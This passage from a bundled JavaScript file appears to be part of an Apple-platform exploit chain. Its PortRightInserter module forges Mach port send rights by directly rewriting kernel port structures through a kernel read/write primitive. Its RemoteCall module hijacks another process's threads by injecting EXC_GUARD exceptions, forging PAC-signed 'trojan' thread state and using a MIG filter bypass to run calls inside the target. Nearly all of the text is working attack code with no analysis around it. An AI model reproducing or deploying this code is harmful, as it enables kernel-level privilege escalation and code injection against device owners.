/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");






const TAG = "PORTRIGHTINSERTER";

const TASK_SELF = 0x203;
const MACH_PORT_NULL = 0;
const MACH_PORT_TYPE_SEND = 0x10000;
const MACH_PORT_TYPE_DEAD_NAME = 0x100000;

const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;

const MACH_MSG_TYPE_COPY_SEND = 19; 
const MACH_MSG_TYPE_MAKE_SEND = 20;
const MACH_MSG_TYPE_MAKE_SEND_ONCE = 21;

const MACH_MSGH_BITS_COMPLEX = 0x80000000;
const MACH_MSG_PORT_DESCRIPTOR = 0;

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;

const IO_BITS_KOLABEL = 0x00000400;
const IE_BITS_TYPE_MASK = 0x001f0000;

class PortRightInserter {
	
	static insert(portKaddr) {
		const p = this.#newPort();
		//console.log(TAG, "New port: " + Utils.hex(p));
		const pAddr = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortAddr(BigInt(p));
		//console.log(TAG, "New port addr: " + Utils.hex(pAddr));
		if (!pAddr)
			return 0;

		//this.#dumpPort(portKaddr);
		//this.#dumpPort(pAddr);

		const backupBits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(portKaddr);
		//console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
		const needsFixBits = (backupBits & IO_BITS_KOLABEL);

		if (needsFixBits) {
			const newBits = backupBits & ~IO_BITS_KOLABEL;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(portKaddr, newBits);
		}

		this.#fixRefCounts(portKaddr, 1);

		//console.log(TAG, "Fix Ok");
		//this.#dumpPort(portKaddr);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipNsRequest, portKaddr);
		//this.#dumpPort(pAddr);

		let previous = this.#notifyNoSenders(p, MACH_PORT_NULL);
		//console.log(TAG, "Previous right: " + Utils.hex(previous));

		// Change the port rights from send once to send.
		this.#switchToSendRight(previous);

		//this.#fixRefCounts(portKaddr, -1, false);

		// We have a send right to the port, but it's not in our space's hash.
    	// We send the port, then kill the entry. We'll properly receive it afterwards.
		let msgBuff = new ArrayBuffer(40);
		let msgHeader = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"](msgBuff);
		msgHeader.msgh_id = 0x4141;
		msgHeader.msgh_remote_port = p;
		msgHeader.msgh_local_port = p;
		msgHeader.msgh_size = msgBuff.byteLength;
		msgHeader.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	// we send a port descriptor

		let msgBody = new DataView(msgBuff, 24);
		msgBody.setInt32(0, 1, true); 					// msgh_descriptor_count
		msgBody.setUint32(4, previous, true);			// name
		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	// disposition
		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	// type

		//let wMsg64 = new BigUint64Array(msgBuff);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);

		let msgMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(msgMem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_SEND_MSG,
			msgBuff.byteLength, 0,
			p,
			0,
			0);
		//console.log(TAG, "mach_msg: " + ret);
		//Native.callSymbol("sleep", 1);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error sending message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg send: " + ret);

		this.#killRight(previous);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].memSize,
			p,
			1000,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error receiving message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg recv: " + ret);
		//Native.callSymbol("sleep", 1);

		let rMsg = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(msgMem, 40);

		//let rMsg64 = new BigUint64Array(rMsg);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);

		msgBody = new DataView(rMsg, 24);
		previous = msgBody.getUint32(4, true);
		//console.log(TAG, "previous: " + Utils.hex(previous));

		this.#fixRefCounts(portKaddr, -1);

		//this.#dumpPort(portKaddr);

		return previous;
	}

	static #newPort() {
		const options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		const newPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct", TASK_SELF, options, 0n, newPortPtr);
		if (kr != 0) {
			console.log(TAG, `Error creating port: ${kr}`);
			return MACH_PORT_NULL;
		}
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(newPortPtr);
	}

	static #switchToSendRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_SEND;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #killRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_DEAD_NAME;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(entry, 0n);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #fixRefCounts(portAddr, diff, updateRefs=true, updateSonce=true) {
		// Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
		// since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
		// So we read all the 144 bytes struct, changes values and then write it again as a whole.

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPort = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPortView = new DataView(ipcPort);

		let refs = ipcPortView.getUint32(0x4, true);
		let sonce = ipcPortView.getUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), true);

		//console.log(TAG, "refs: " + refs);
		//console.log(TAG, "sonce: " + sonce);

		refs += diff;
		sonce += diff;

		if (updateRefs) {
			//console.log(TAG, "new refs: " + refs);
			ipcPortView.setUint32(0x4, refs, true);
		}
		if (updateSonce) {
			//console.log(TAG, "new sonce: " + sonce);
			ipcPortView.setUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), sonce, true);
		}

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, ipcPort);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].writeZoneElement(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
	}

	static #notifyNoSenders(port, notifyPort) {
		const MACH_NOTIFY_NO_SENDERS = 0o106;
		
		const previousPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_request_notification",
			TASK_SELF,
			port,
			MACH_NOTIFY_NO_SENDERS,
			0,
			notifyPort,
			MACH_MSG_TYPE_MAKE_SEND_ONCE,
			previousPtr);
		//console.log(TAG, "mach_port_request_notification: " + kr);
		if (kr != 0)
			return MACH_PORT_NULL;
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(previousPtr);
	}

	static #dumpPort(pAddr) {
		console.log(TAG, "dump port: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(pAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(pAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<0x12; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}

	static #dumpEntry(entryAddr) {
		console.log(TAG, "dump entry: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(entryAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(entryAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<3; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/RegistersStruct.js":
/*!*********************************************!*\
  !*** ./src/libs/TaskRop/RegistersStruct.js ***!
  \*********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ RegistersStruct)
/* harmony export */ });
const TAG = "REGISTERSSTRUCT"

class RegistersStruct
{
	#dataView;

	constructor(buffer, offset = 0, length = 29) {
		this.#dataView = new DataView(buffer,offset, length * 8);
		this.length = length;
	}
    
	get(index) {
        if (index >= this.length || index < 0) {
            console.log(TAG,`Got wrong index in get:${index}`);
			return;
        }
        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian
    }

    set(index, value) {
        if (index >= this.length || index < 0) {
            console.log(TAG,`Got wrong index in set`);
			return;
        }
        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian
    }
}

/***/ }),

/***/ "./src/libs/TaskRop/RemoteCall.js":
/*!****************************************!*\
  !*** ./src/libs/TaskRop/RemoteCall.js ***!
  \****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ RemoteCall)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _Thread__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Thread */ "./src/libs/TaskRop/Thread.js");
/* harmony import */ var _Exception__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./Exception */ "./src/libs/TaskRop/Exception.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
/* harmony import */ var _PAC__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./PAC */ "./src/libs/TaskRop/PAC.js");
/* harmony import */ var _VM__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./VM */ "./src/libs/TaskRop/VM.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _PortRightInserter__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./PortRightInserter */ "./src/libs/TaskRop/PortRightInserter.js");












//import ExceptionThreadJS17 from '!raw-loader!./ExceptionThread17.js'
//import ExceptionThreadJS18 from '!raw-loader!./ExceptionThread18.js'

//import Offsets from "Driver/Offsets";

const TAG = "REMOTECALL"
const GUARD_TYPE_MACH_PORT = 0x1n;
const kGUARD_EXC_INVALID_RIGHT = BigInt(1 << 8);
const SWITCH_OPTION_NONE = 0n;
const fakePCTrojanCreator = 0x101n;
const fakeLRTrojanCreator = 0x201n;
const fakePCTrojan = 0x301n;
const fakeLRTrojan = 0x401n;
const __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK = 0xff000000n;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR = 0x2;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC = 0x4;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR = 0x8;
const SHMEM_CACHE_SIZE = 100;
const MAP_PRIVATE = 0x0002n;
const MAP_ANON = 0x1000n;

class RemoteCall
{
	#taskAddr;
	#creatingExtraThread;
	#firstExceptionPort;
	#secondExceptionPort;
	#firstExceptionPortAddr;
	#secondExceptionPortAddr;
	#dummyThread;
	#dummyThreadMach;
	#dummyThreadAddr;
	#dummyThreadTro;
	#selfThreadAddr;
	#selfThreadCtid;
	#trojanThreadAddr;
	#callThreadAddr;
	#originalState;
	#vmMap;
	#trojanMem;
	#localPort;
	#remotePort;
	#shmemCache = new Array(SHMEM_CACHE_SIZE);
	//#exceptionThreadCFString;
	#success = false;
	#threadList = [];
	#krwControlFd;
	#krwRwFd;
	#pid;

	constructor(param, migFilterBypass=null)
	{
		if(typeof(param) == "string")
		{
			console.log(TAG,`Getting task by name: ${param}`);
			this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param);
			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
		}
		else
		{
			console.log(TAG,`Getting task by pid: ${param}`);
			this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByPID(param);
			this.#pid = param;
			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
		}

		if(!this.#taskAddr)
		{
			console.log(TAG,`Cannot get taskAddr, returning`);
			return null;
		}

		/*
		let threadmMem = 0n;
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
		}
		else
		{
			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
		}
		//Native.callSymbol("free", threadmMem);
		*/

		let firstExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
		let secondExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
	
		if (!firstExceptionPort || !secondExceptionPort)
		{
			console.log(TAG,`Couldn't create exception ports`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, firstExceptionPort, 0n, 0n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, secondExceptionPort, 0n, 0n);
			return null;
		}
		// Make sure the task won't crash after we handle an exception
		_Task__WEBPACK_IMPORTED_MODULE_3__["default"].disableExcGuardKill(this.#taskAddr);

		let guardCode = 0n;
		guardCode = this.#EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
		guardCode = this.#EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
		guardCode = this.#EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503n);
		let firstPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(firstExceptionPort);
		let secondPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(secondExceptionPort);
		//console.log(TAG,`Exception port 1:${Utils.hex(firstExceptionPort)} with kAddr:${Utils.hex(firstPortAddr)}`);
		//console.log(TAG,`Exception port 2:${Utils.hex(secondExceptionPort)} with kAddr:${Utils.hex(secondPortAddr)}`);

		let dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let dummyFunc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("getpid");
		//console.log(TAG,`dummyFunc:${Utils.hex(dummyFunc)}`);
		
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
		dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
		let dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
		let dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(dummyThreadMach);
		let dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(dummyThreadAddr);
		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_thread_self"));
		let selfThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
		let selfThreadCtid = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getCtid(selfThreadAddr);
	
		//console.log(TAG,`Dummy thread:${Utils.hex(dummyThreadMach)}`);
		//console.log(TAG,`Dummy thread object:${Utils.hex(dummyThreadAddr)}`);
		//console.log(TAG,`Dummy thread tro:${Utils.hex(dummyThreadTro)}`);
	
		//console.log(TAG,`Self thread:${Utils.hex(threadSelf)}`);
		//console.log(TAG,`Self thread object:${Utils.hex(selfThreadAddr)}`);
		//console.log(TAG,`Guard exc code:${Utils.hex(guardCode)}`);
		//console.log(TAG,`Self thread ctid:${Utils.hex(selfThreadCtid)}`);
		
		this.#creatingExtraThread = true;
		this.#firstExceptionPort = firstExceptionPort;
		this.#secondExceptionPort = secondExceptionPort;
		this.#firstExceptionPortAddr = firstPortAddr;
		this.#secondExceptionPortAddr = secondPortAddr;
		this.#dummyThread = dummyThread;
		this.#dummyThreadMach = dummyThreadMach;
		this.#dummyThreadAddr = dummyThreadAddr;
		this.#dummyThreadTro = dummyThreadTro;
		this.#selfThreadAddr = selfThreadAddr;
		this.#selfThreadCtid = selfThreadCtid;
		let retryCount = 0;
		let validThreadCount = 0;
		let successThreadCount = 0;
		let firstThread = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
		let currThread = firstThread;
	
		this.#trojanThreadAddr = firstThread;

		if (migFilterBypass)
			migFilterBypass.resume();
		
		while ( true && successThreadCount < 2 && validThreadCount < 5 && retryCount < 15)
		{
			let task = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread);
			if (!task)
			{
				if (!validThreadCount)
				{
					console.log(TAG, `failed on getting first thread at all, resetting first thread and currThread`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else
					break;
			}
			//console.log(TAG,`Trying Inject EXC_GUARD on thread:${Utils.hex(currThread)} with tro task:${Utils.hex(task)}`);
			if (task == this.#taskAddr)
			{
				if (!this.#setExceptionPortOnThread(this.#firstExceptionPort, currThread, migFilterBypass))
				{
					console.log(TAG, `Set exception port on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
					if (!validThreadCount)
					{
						console.log(TAG, `failed on first thread, resetting first thread and currThread`);
						firstThread = currThread = this.#retryFirstThread(migFilterBypass);
						retryCount++;
						continue;
					}
				}
				else
				{
					// Inject a EXC_GUARD exception on this thread
					if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].injectGuardException(currThread, guardCode))
					{
						console.log(TAG,`Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
						if (!validThreadCount)
						{
							console.log(TAG, `failed on first thread, resetting first thread and currThread`);
							firstThread = currThread = this.#retryFirstThread(migFilterBypass);
							retryCount++;
							continue;
						}
					}
					else
					{
						successThreadCount++;
						this.#threadList.push(currThread);
						console.log(TAG, `Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} OK`);
					}
				}
				validThreadCount++;
			}
			else if (task && !validThreadCount)
			{
				console.log(TAG,`Got weird tro on first thread, resetting first thread and currThread`);
				firstThread = currThread = this.#retryFirstThread(migFilterBypass);
				retryCount++;
				continue;
			}

			let next = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].next(currThread);
			if (!next)
			{
				if (!validThreadCount) {
					console.log(TAG, `Got empty next thread on first thread. Retry`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else {
					console.log(TAG, "Break because of empty next thread");
					break;
				}
			}
			currThread = next;
		}

		if (migFilterBypass)
			migFilterBypass.pause();

		console.log(TAG, `Valid threads: ${validThreadCount}`);
		console.log(TAG, `Injected threads: ${successThreadCount}`);

		if (!this.#threadList.length) {
			console.log(TAG, "Exception injection failed. Aborting.");
			this.destroy();
			return null;
		}

		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		// Since we are in background, we don't mind to wait a lot!
		if(!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort,excBuffer,120000,false))
		{
			console.log(TAG, `Failed to receive first exception`);
			this.destroy();
			return null;
		}

		//console.log(TAG,`Got first exception succesfully`);
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		// Save state to restore its execution after trojan thread creation TODO make it inside ThreadState to copy thread state to another variable
		let originalStateBuff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64_SIZE);
		this.#originalState = new _ThreadState__WEBPACK_IMPORTED_MODULE_7__["default"](originalStateBuff);
		for(let i = 0; i < 29; i++)
		{
			this.#originalState.registers.set(i,exc.threadState.registers.get(i));
		}
		this.#originalState.opaque_fp = exc.threadState.opaque_fp;
		this.#originalState.opaque_lr = exc.threadState.opaque_lr;
		this.#originalState.opaque_sp = exc.threadState.opaque_sp;
		this.#originalState.opaque_pc = exc.threadState.opaque_pc;
		this.#originalState.cspr = exc.threadState.cspr;
		this.#originalState.opaque_flags = exc.threadState.opaque_flags;
	
		//console.log(TAG,`Clear EXC_GUARD from all other threads...`);

		for(let i = 0; i < this.#threadList.length;i++)
		{
			_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(this.#threadList[i]);
			//console.log(TAG,`Clear EXC_GUARD on thread:${Utils.hex(this.#threadList[i])} OK`);
		}
		console.log(TAG,`Finish clearing EXC_GUARD from all other threads...`);
		let desiredTimeout = 1500;
		// Flush exceptions in other threads (is that really needed?)
		while (true)
		{
			let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, desiredTimeout, false))
				break;
			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
			//threadClearGuardException(remoteCall->trojanThreadAddr);
			_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, exc.threadState,false);
		}
		//console.log(TAG,`finished flushing exceptions`);
		let newState = exc.threadState;
		//console.log(TAG,`gadget_pacia:${Utils.hex(PAC.gadget_pacia)}`);
		newState = this.#signState(firstThread, newState, fakePCTrojanCreator, fakeLRTrojanCreator);
		//console.log(TAG,`updated PC:${Utils.hex(newState.opaque_pc)} and LR:${Utils.hex(newState.opaque_lr)}`);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		//console.log(TAG,`Trojan thread created`);
		
		//console.log(TAG,`Test remote getpid()`);
		//let pidRemote = this.#doRemoteCallTemp(100, "getpid");
		//console.log(TAG,`pidRemote:${pidRemote}`);
		
		// Use stack as a temporary remote memory
		let trojanMemTemp = exc.threadState.opaque_sp & 0x7fffffffffn;
		//console.log(TAG,`Remote memory:${Utils.hex(trojanMemTemp)}`);
		
		// Substracting a bit from stack pointer to not corrupt original stack
		trojanMemTemp = trojanMemTemp - 0x100n;

		this.#vmMap = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getMap(this.#taskAddr);
		//console.log(TAG,`vmMap:${Utils.hex(this.#vmMap)}`);

		// Create a remote pthread that should always crash on first execution, so we can control it with exceptions.
		let remoteCrashSigned = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, fakePCTrojan, 0n);
		//console.log(TAG,`remoteCrashSigned:${Utils.hex(remoteCrashSigned)}`);

		let ret = this.#doRemoteCallTemp(100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
		//console.log(TAG,`pthread_create_suspended_np:${Utils.hex(ret)}`);
		//VM.mocker(0x221d54,0xffffffdc08875500n);
		
		let pthreadAddr = this.read64(BigInt(trojanMemTemp));
		//console.log(TAG,`pthreadAddr:${Utils.hex(pthreadAddr)}`);
